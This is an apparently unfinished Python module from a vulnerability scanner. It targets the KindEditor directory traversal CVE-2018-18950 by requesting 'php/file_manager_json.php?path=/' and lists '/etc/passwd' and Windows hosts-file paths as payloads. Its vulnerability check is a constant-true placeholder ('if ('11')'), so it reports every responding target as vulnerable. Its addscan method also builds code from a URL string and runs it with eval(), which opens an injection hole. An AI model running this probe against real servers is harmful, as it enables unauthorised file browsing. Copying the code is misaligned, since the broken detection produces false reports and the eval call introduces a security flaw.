#!/usr/bin/env python3
# -*- coding:utf-8 -*-

''' 还没写好
KindEditor是一套开源的HTML可视化编辑器
    Kindeditor扫描类: 
        Kindeditor 目录遍历
            CVE-2018-18950
                Payload: https://baizesec.github.io/bylibrary/%E6%BC%8F%E6%B4%9E%E5%BA%93/02-%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E/Kindeditor/KindEditor%203.4.2%263.5.5%E5%88%97%E7%9B%AE%E5%BD%95%E6%BC%8F%E6%B4%9E/

file:///etc/passwd
file:///C:\Windows\System32\drivers\etc\hosts
'''

from lib.api.dns import dns
from lib.initial.config import config
from lib.tool.md5 import md5, random_md5
from lib.tool.logger import logger
from lib.tool.thread import thread
from lib.tool import check
from thirdparty import requests
from time import sleep

class Kindeditor():
    def __init__(self):
        self.timeout = config.get('timeout')
        self.headers = config.get('headers')
        self.proxies = config.get('proxies')

        self.app_name = 'Kindeditor'
        self.md = md5(self.app_name)
        self.cmd = 'echo ' + self.md

        self.cve_2018_18950_payloads = [
            {
                'path': 'php/file_manager_json.php?path=/',
                'data': ''
            },
        ]

    def cve_2018_18950_scan(self, url):
        ''' KindEditor 3.4.2/3.5.5版本中的php/file_manager_json.php文件存在目录遍历漏洞, 
            远程攻击者可借助"path"参数利用该漏洞浏览文件
        '''
        vul_info = {}
        vul_info['app_name'] = self.app_name
        vul_info['vul_type'] = 'FIle-Read'
        vul_info['vul_id'] = 'CVE-2018-18950'
        vul_info['vul_method'] = 'GET'
        vul_info['headers'] = {}

        # headers = self.headers.copy()
        # headers.update(vul_info['headers'])

        for payload in self.cve_2018_18950_payloads:
            path = payload['path']
            data = payload['data']
            target = url + path

            vul_info['path'] = path
            vul_info['data'] = data
            vul_info['target'] = target

            try:
                res = requests.get(
                    target, 
                    timeout=self.timeout, 
                    headers=self.headers,
                    data=data, 
                    proxies=self.proxies, 
                    verify=False,
                    allow_redirects=False
                )
                logger.logging(vul_info, res.status_code, res)                        # * LOG
            except requests.ConnectTimeout:
                logger.logging(vul_info, 'Timeout')
                return None
            except requests.ConnectionError:
                logger.logging(vul_info, 'Faild')
                return None
            except:
                logger.logging(vul_info, 'Error')
                return None

            if ('11'):
                results = {
                    'Target': target,
                    'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                    'Method': vul_info['vul_method'],
                    'Payload': {
                        'Url': url,
                        'Path': path
                    }
                }
                return results

    def addscan(self, url, vuln=None):
        if vuln:
            return eval('thread(target=self.{}_scan, url="{}")'.format(vuln, url))

        return [
            thread(target=self.cve_2018_18950_scan, url=url)
        ]

kindeditor = Kindeditor()
